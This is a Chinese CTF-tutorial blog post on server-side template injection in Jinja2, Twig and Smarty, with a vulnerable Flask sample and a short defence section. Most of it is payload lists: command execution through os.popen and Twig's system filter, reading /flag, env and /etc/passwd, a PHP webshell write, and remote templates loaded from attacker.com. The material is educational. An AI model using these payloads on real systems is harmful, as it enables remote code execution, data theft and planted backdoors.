<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>web-ssti注入 | 24kmagic</title><meta name="author" content="qyt"><meta name="copyright" content="qyt"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="web-ssti注入模板注入初步https:&#x2F;&#x2F;hello-ctf.com&#x2F;hc-web&#x2F;ssti&#x2F;#_1 ProbiusOfficial&#x2F;Hello-CTF 前置知识¶在开始之前，我们先大概介绍一下什么是模板，什么又是模板注入。 什么是模板¶模板 是一种用于生成动态内容的工具。   它们通常包含两个基本部分： 比如下图为 Hello-CTFtime 项目中，渲染比赛列表的时候用到的模板">
<meta property="og:type" content="article">
<meta property="og:title" content="web-ssti注入">
<meta property="og:url" content="https://2829750658t-svg.github.io/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/sstizhuru/index.html">
<meta property="og:site_name" content="24kmagic">
<meta property="og:description" content="web-ssti注入模板注入初步https:&#x2F;&#x2F;hello-ctf.com&#x2F;hc-web&#x2F;ssti&#x2F;#_1 ProbiusOfficial&#x2F;Hello-CTF 前置知识¶在开始之前，我们先大概介绍一下什么是模板，什么又是模板注入。 什么是模板¶模板 是一种用于生成动态内容的工具。   它们通常包含两个基本部分： 比如下图为 Hello-CTFtime 项目中，渲染比赛列表的时候用到的模板">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://2829750658t-svg.github.io/img/butterfly-icon.png">
<meta property="article:published_time" content="2026-01-21T11:39:43.000Z">
<meta property="article:modified_time" content="2026-01-23T04:48:40.953Z">
<meta property="article:author" content="qyt">
<meta property="article:tag" content="ssti注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://2829750658t-svg.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "web-ssti注入",
  "url": "https://2829750658t-svg.github.io/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/sstizhuru/",
  "image": "https://2829750658t-svg.github.io/img/butterfly-icon.png",
  "datePublished": "2026-01-21T11:39:43.000Z",
  "dateModified": "2026-01-23T04:48:40.953Z",
  "author": [
    {
      "@type": "Person",
      "name": "qyt",
      "url": "https://2829750658t-svg.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/images/favicon.png"><link rel="canonical" href="https://2829750658t-svg.github.io/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/sstizhuru/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'web-ssti注入',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="google-site-verification" content="xcoxCJdnrLSrFpybmYmk6WSRqz-H1rnZB7BKSjdkWD0" /><meta name="google-site-verification" content="H8Bhbw_EXOKyVq27SUdcn_avXaVqBOWzs2lPJV_HSVw" /><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/images/bj2.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">24kmagic</span></a><a class="nav-page-title" href="/"><span class="site-name">web-ssti注入</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">web-ssti注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-21T11:39:43.000Z" title="发表于 2026-01-21 19:39:43">2026-01-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-23T04:48:40.953Z" title="更新于 2026-01-23 12:48:40">2026-01-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf%E9%A2%98%E8%A7%A3/">ctf题解</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf%E9%A2%98%E8%A7%A3/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="web-ssti注入"><a href="#web-ssti注入" class="headerlink" title="web-ssti注入"></a>web-ssti注入</h2><h3 id="模板注入初步https-hello-ctf-com-hc-web-ssti-1"><a href="#模板注入初步https-hello-ctf-com-hc-web-ssti-1" class="headerlink" title="模板注入初步https://hello-ctf.com/hc-web/ssti/#_1"></a>模板注入初步<a target="_blank" rel="noopener" href="https://hello-ctf.com/hc-web/ssti/#_1">https://hello-ctf.com/hc-web/ssti/#_1</a></h3><blockquote>
<h3 id="ProbiusOfficial-Hello-CTF"><a href="#ProbiusOfficial-Hello-CTF" class="headerlink" title="ProbiusOfficial&#x2F;Hello-CTF"></a><a target="_blank" rel="noopener" href="https://github.com/ProbiusOfficial/Hello-CTF">ProbiusOfficial&#x2F;Hello-CTF</a></h3></blockquote>
<h2 id="前置知识¶"><a href="#前置知识¶" class="headerlink" title="前置知识¶"></a>前置知识<a target="_blank" rel="noopener" href="https://hello-ctf.com/hc-web/ssti/#_2">¶</a></h2><p>在开始之前，我们先大概介绍一下什么是模板，什么又是模板注入。</p>
<h3 id="什么是模板¶"><a href="#什么是模板¶" class="headerlink" title="什么是模板¶"></a>什么是模板<a target="_blank" rel="noopener" href="https://hello-ctf.com/hc-web/ssti/#_3">¶</a></h3><p><strong>模板</strong> 是一种用于生成动态内容的工具。  </p>
<p>它们通常包含两个基本部分：</p>
<p>比如下图为 Hello-CTFtime 项目中，渲染比赛列表的时候用到的模板：</p>
<p><strong>绿色</strong> 部分为 <strong>静态内容</strong> ，而 <strong>橙色</strong> 部分则是 <strong>动态占位符</strong> </p>
<p><img src="/images/image-20231128133158187.png" alt="image-20231128133158187"></p>
<p>大多数模板的工作流程：</p>
<p><strong>定义模板  -&gt;  传递数据  -&gt; 渲染模板  -&gt; 输出生成</strong></p>
<p><img src="/images/image-20231128135756055.png" alt="image-20231128135756055"></p>
<h3 id="什么是模板注入¶"><a href="#什么是模板注入¶" class="headerlink" title="什么是模板注入¶"></a>什么是模板注入<a target="_blank" rel="noopener" href="https://hello-ctf.com/hc-web/ssti/#_4">¶</a></h3><p>我们之前在说SQL注入的时候，这样描述SQL注入 “<strong>通过可控输入点达到非预期执行数据库语句</strong>”，比如后台预期的语句是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = &quot;数据传递点&quot;</span><br></pre></td></tr></table></figure>

<p>在预期情况下，数据传递点只会是 1，2，3，4……</p>
<p>但是我们要是让数据传入点的值为 <code>1&quot; union select 1,group_concat(schema_name) from information_schema.schemata --</code></p>
<p>后台执行的语句就变成了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = &quot;1&quot; union select 1,group_concat(schema_name) from information_schema.schemata --&quot;</span><br></pre></td></tr></table></figure>

<p>这时候不仅会查询 <code>id=1</code>的数据，还会把所有数据库的名字一同查询出来。</p>
<p>同样的 <strong>「模板注入 SSTI(Server-Side Template Injection)」</strong> 也一样，**数据传递*<em>就是可控的输入点，以 *<em>Jinja2</em></em> 举例，Jinja2 在渲染的时候会把<code>{{}}</code>包裹的内容当做变量解析替换，所以当我们传入 <code>{{表达式}}</code> 时，表达式就会被渲染器执行。</p>
<p>比如下面的示例代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">from flask import render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    template = &#x27;&#x27;&#x27;</span><br><span class="line">    &lt;p&gt;Hello %s &lt;/p&gt;&#x27;&#x27;&#x27; % (request.args.get(&#x27;name&#x27;))</span><br><span class="line">    return render_template_string(template)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>当我们传入 {{9*9}} 时他会帮我们运算后输出 81</p>
<p><img src="/images/image-20231128141012093.png" alt="image-20231128141012093"></p>
<h2 id="Python模板注入一般流程¶"><a href="#Python模板注入一般流程¶" class="headerlink" title="Python模板注入一般流程¶"></a>Python模板注入一般流程<a target="_blank" rel="noopener" href="https://hello-ctf.com/hc-web/ssti/#python">¶</a></h2><blockquote>
<p>注意模板注入是一种方式，它不归属于任何语言，不过目前遇见的大多数题目还是以python的SSTI为主，所以我们用 Python SSTI 为例子带各位熟悉模板注入。</p>
</blockquote>
<p>一般我们会在疑似的地方尝试插入简单的模板表达式，如 <code>{{7*7}}</code> <code>{{config}}</code>，看看是否能在页面上显示预期结果，以此确定是否有注入点。</p>
<p>当然本来还需要识别模板的，但大多数题目都是 Jinja2 就算，是其他模板，多也以Python为主，所以不会差太多，所以我们这里统一用 Jinja 来讲。</p>
<h3 id="引¶"><a href="#引¶" class="headerlink" title="引¶"></a>引<a target="_blank" rel="noopener" href="https://hello-ctf.com/hc-web/ssti/#_5">¶</a></h3><p>很多时候，你在阅读SSTI相关的WP时，你会发现最后的payload都差不多长下面的样子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[40](&#x27;flag&#x27;).read()&#125;&#125; </span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[257](&#x27;flag&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>



<p>逻辑：</p>
<p>比如我们现在就只拿到了 A，但我们想读取目录下面的 flag ，于是就有了下面的尝试：</p>
<p><strong>找对象A的类 - 类A</strong> -&gt; <strong>找类A的父亲 - 类B</strong> -&gt; <strong>找祖先&#x2F;基类 - 类O</strong>  -&gt; <strong>遍历祖先下面所有的子类</strong> -&gt; <strong>找到可利用的类 类F 类G</strong>-&gt;  <strong>构造利用方法</strong>-&gt;  <strong>读写文件&#x2F;执行命令</strong></p>
<p><strong>拿基类 -&gt; 找子类 -&gt; 构造命令执行或者文件读取负载 -&gt; 拿flag</strong> 是python模板注入的正常流程。</p>
<h3 id="来来来，分类，什么时候用什么请看好"><a href="#来来来，分类，什么时候用什么请看好" class="headerlink" title="来来来，分类，什么时候用什么请看好"></a>来来来，分类，什么时候用什么请看好</h3><p>不要像我一样把python的用到php里面了，</p>
<ol>
<li><strong>Jinja2 (Python):</strong> <code>{{7*7}}</code> 会得到 <code>49</code>，但 <code>{{7*&#39;7&#39;}}</code> 会得到 <code>7777777</code>（字符串重复）。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;env&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;env&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; request.application.__globals__[&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;env&quot;).read() &#125;&#125;</span><br><span class="line">&#123;% print(url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;))%&#125;</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">&#123;&#123;self.__init__.__globals__.__builtins__.open(&#x27;/flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>



<ol start="2">
<li><strong>Twig (PHP):</strong> <code>{{7*7}}</code> 会得到 <code>49</code>，而 <code>{{7*&#39;7&#39;}}</code> 也会得到 <strong><code>49</code></strong>。</li>
</ol>
<ul>
<li><strong>原理：</strong> PHP 是弱类型语言，在进行算术运算时，它会自动把字符串 <code>&#39;7&#39;</code> 转换为数字 <code>7</code>。</li>
</ul>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1. 命令执行类 (RCE)</span><br><span class="line">Twig</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;cat /flag&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;cat /flag&quot;, 0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;cat /flag&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;system&quot;, &quot;cat /flag&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&#x27;cat /flag&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">2. 文件读取类 (无命令执行时)</span><br><span class="line">Twig</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;/flag&#x27;|file_excerpt(1,30)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.files.get(1).__construct(&#x27;/flag&#x27;,&#x27;&#x27;)&#125;&#125;&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;</span><br><span class="line"></span><br><span class="line">3. 环境篡改与后门类</span><br><span class="line">Twig</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;</span><br><span class="line"></span><br><span class="line">4. 木马写入类</span><br><span class="line">Twig</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;&quot;&lt;?php echo file_get_contents(&#x27;/flag&#x27;);?&gt;&quot;:&quot;/var/www/html/f.php&quot;&#125;|map(&quot;file_put_cont</span><br></pre></td></tr></table></figure>







<ol start="3">
<li><strong>Smarty (PHP):</strong> 通常只支持 <code>{7*7}</code>（单大括号）。</li>
</ol>
<h2 id="细讲twig注入："><a href="#细讲twig注入：" class="headerlink" title="细讲twig注入："></a>细讲twig注入：</h2><h3 id="1-测试流程"><a href="#1-测试流程" class="headerlink" title="1. 测试流程"></a>1. 测试流程</h3><ol>
<li>检测注入点 → 2. 判断沙盒状态 → 3. 尝试基础Payload → 4. 绕过沙盒 → 5. 提权</li>
</ol>
<h3 id="漏洞利用与Payload"><a href="#漏洞利用与Payload" class="headerlink" title="漏洞利用与Payload"></a>漏洞利用与Payload</h3><h3 id="1-非沙盒模式"><a href="#1-非沙盒模式" class="headerlink" title="1. 非沙盒模式"></a>1. 非沙盒模式</h3><h4 id="命令执行（需exec函数可用）"><a href="#命令执行（需exec函数可用）" class="headerlink" title="命令执行（需exec函数可用）"></a>命令执行（需<code>exec</code>函数可用）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[&#x27;id&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;       </span><br><span class="line">&#123;&#123;[&#x27;cat /flag&#x27;]|map(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;app.request.files.get(1).__construct(&#x27;/etc/passwd&#x27;,&#x27;&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.files.get(1).openFile.read(1000)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用-self对象（旧版本）"><a href="#利用-self对象（旧版本）" class="headerlink" title="利用_self对象（旧版本）"></a>利用<code>_self</code>对象（旧版本）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.setCache(&quot;ftp://attacker.com&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.loadTemplate(&quot;恶意模板&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-沙盒绕过技巧"><a href="#2-沙盒绕过技巧" class="headerlink" title="2. 沙盒绕过技巧"></a>2. 沙盒绕过技巧</h3><h4 id="使用内置过滤器链"><a href="#使用内置过滤器链" class="headerlink" title="使用内置过滤器链"></a>使用内置过滤器链</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[&#x27;id&#x27;]|filter(&#x27;system&#x27;)|join(&#x27;,&#x27;)&#125;&#125;  &lt;!-- 绕过黑名单检查 --&gt;</span><br></pre></td></tr></table></figure>

<h4 id="利用属性注入"><a href="#利用属性注入" class="headerlink" title="利用属性注入"></a>利用属性注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;app.request.query.filter(&#x27;system&#x27;,&#x27;id&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="模板继承攻击"><a href="#模板继承攻击" class="headerlink" title="模板继承攻击"></a>模板继承攻击</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;http://attacker.com/malicious.twig&quot; %&#125; </span><br></pre></td></tr></table></figure>

<h3 id="3-其他Payload"><a href="#3-其他Payload" class="headerlink" title="3. 其他Payload"></a>3. 其他Payload</h3><p>• <strong>信息泄露</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;app.request.server.all|join(&#x27;,&#x27;)&#125;&#125;  &lt;!-- 泄露服务器变量 --&gt;</span><br><span class="line">&#123;&#123;_self&#125;&#125;                             &lt;!-- 转储_self对象 --&gt;</span><br></pre></td></tr></table></figure>

<p>• <strong>XSS利用</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;&#125;&#125;       &lt;!-- 需关闭自动转义 --&gt;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="四、防御手段"><a href="#四、防御手段" class="headerlink" title="四、防御手段"></a>四、防御手段</h2><h3 id="1-官方推荐"><a href="#1-官方推荐" class="headerlink" title="1. 官方推荐"></a>1. 官方推荐</h3><p>• <strong>启用沙盒模式</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$policy = new \Twig\Sandbox\SecurityPolicy([], [], [], [], []);</span><br><span class="line">$twig-&gt;addExtension(new \Twig\Extension\SandboxExtension($policy, true));</span><br></pre></td></tr></table></figure>

<p>• <strong>输入过滤</strong>：避免用户输入直接控制模板内容。<br>• <strong>禁用危险函数</strong>：在<code>php.ini</code>中禁用<code>system</code>、<code>exec</code>等函数。</p>
<h3 id="2-安全配置"><a href="#2-安全配置" class="headerlink" title="2. 安全配置"></a>2. 安全配置</h3><p>• 更新至最新版本（≥Twig 3.x）。<br>• 使用白名单限制模板可访问的类和方法。<br>• 避免动态拼接模板内容。</p>
<hr>
<h2 id="五、绕过技巧"><a href="#五、绕过技巧" class="headerlink" title="五、绕过技巧"></a>五、绕过技巧</h2><h3 id="1-字符串拼接"><a href="#1-字符串拼接" class="headerlink" title="1. 字符串拼接"></a>1. 字符串拼接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[&#x27;id&#x27;]|filter(&#x27;sy&#x27;~&#x27;stem&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-利用attribute函数"><a href="#2-利用attribute函数" class="headerlink" title="2. 利用attribute函数"></a>2. 利用<code>attribute</code>函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;attribute(_self, &#x27;env&#x27;)&#125;&#125;  &lt;!-- 访问受限属性 --&gt;</span><br></pre></td></tr></table></figure>

